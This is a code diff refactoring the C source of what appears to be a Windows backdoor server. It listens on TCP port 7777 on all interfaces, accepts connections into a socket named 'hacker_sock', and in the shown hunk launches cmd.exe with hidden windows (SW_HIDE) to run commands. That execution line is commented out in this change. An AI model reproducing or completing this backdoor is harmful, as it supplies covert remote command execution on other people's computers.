@@ -9,79 +9,67 @@
 
 SOCKET InitServer()
 {
+	return 0;
+}
+
+VOID RunServer( )
+{
 	INT     iResult = 0;
 	WSADATA wsaData;
-	if (iResult = WSAStartup(MAKEWORD(2, 2), &wsaData)) 
+	if (iResult = WSAStartup(MAKEWORD(2, 2), &wsaData))
 	{
-		printf("WSAStartup failed with error: %d\n", iResult); 
+		_tprintf("WSAStartup failed with error: %d\n", iResult);
 
-		return INVALID_SOCKET;
+		return ;
+	}
+	_tprintf("Startup finished\n");
+
+	SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (listen_sock == INVALID_SOCKET)
+	{
+		_tprintf("socket failed with error: %ld\n", WSAGetLastError());
+
+		WSACleanup();
+
+		return;
 	}
 
-	struct addrinfo hints;
-	ZeroMemory(&hints, sizeof(hints));
-	hints.ai_family   = AF_INET;
-	hints.ai_socktype = SOCK_STREAM;
-	hints.ai_protocol = IPPROTO_TCP;
-	hints.ai_flags    = AI_PASSIVE;
-
-	struct addrinfo *result = NULL;
-	if (iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result)) 
+	SOCKADDR_IN addr_sock;
+	addr_sock.sin_family      = AF_INET;
+	addr_sock.sin_addr.s_addr = htonl(INADDR_ANY);
+	addr_sock.sin_port        = htons(7777);
+	if (bind(listen_sock, (LPSOCKADDR)&addr_sock, sizeof(struct sockaddr)))
 	{
-		printf("getaddrinfo failed with error: %d\n", iResult);
-
-		WSACleanup(); 
-
-		return INVALID_SOCKET;
-	}
-
-	SOCKET listen_sock = INVALID_SOCKET; 
-	if ((listen_sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol)) == INVALID_SOCKET) 
-	{
-		printf("socket failed with error: %ld\n", WSAGetLastError());
-
-		freeaddrinfo(result);
-		WSACleanup(); 
-
-		return INVALID_SOCKET;
-	}
-
-	if (bind(listen_sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) 
-	{
-		printf("bind failed with error: %d\n", WSAGetLastError());
-
-		freeaddrinfo(result);
-		closesocket(listen_sock);
-		WSACleanup(); 
-
-		return INVALID_SOCKET;
-	}
-
-	freeaddrinfo(result);
-
-	if (listen(listen_sock, SOMAXCONN) == SOCKET_ERROR) 
-	{
-		printf("listen failed with error: %d\n", WSAGetLastError());
+		_tprintf("bind failed with error: %d\n", WSAGetLastError());
 
 		closesocket(listen_sock);
 		WSACleanup();
 
-		return INVALID_SOCKET;
+		return;
 	}
+	_tprintf("Binding socket finished\n");
 
-	return listen_sock;
-}
+	if (listen(listen_sock, 1))
+	{
+		_tprintf("listen failed with error: %d\n", WSAGetLastError());
 
-VOID RunServer(SOCKET listen_sock)
-{
+		closesocket(listen_sock);
+		WSACleanup();
+
+		return;
+	}
+	_tprintf("Started to listen\n");
+
 	TCHAR  cmd[CMD_LENGTH + 1]    = { 0 }, // (cmd + space) + '\0'
 		  args[MAX_BUFFER_LENGTH] = { 0 };
 	while (TRUE)
 	{
+		_tprintf("Waiting for the client\n");
+
 		SOCKET hacker_sock = INVALID_SOCKET; 
 		if ((hacker_sock = accept(listen_sock, NULL, NULL)) == INVALID_SOCKET)
 		{
-			printf("accept failed with error: %d\n", WSAGetLastError());
+			_tprintf("accept failed with error: %d\n", WSAGetLastError());
 
 			closesocket(listen_sock);
 
@@ -115,7 +103,7 @@ VOID RunServer(SOCKET listen_sock)
 				// shell.nShow = SW_HIDE;
 				// ShellExecuteEx(&shell);
 				// WaitForSingleObject(shell.hProcess, INFINITE);
-				ShellExecuteEx(NULL, TEXT("open"), TEXT("cmd.exe"), TEXT("ipconfig > a.out"), NULL, SW_HIDE);
+				//ShellExecuteEx(NULL, TEXT("open"), TEXT("cmd.exe"), TEXT("ipconfig > a.out"), NULL, SW_HIDE);
 				break; 
 			}
 
@@ -127,5 +115,6 @@ VOID RunServer(SOCKET listen_sock)
 		}
 
 		closesocket(hacker_sock);
+		_tprintf("Client disconnected\n");
 	}
 }
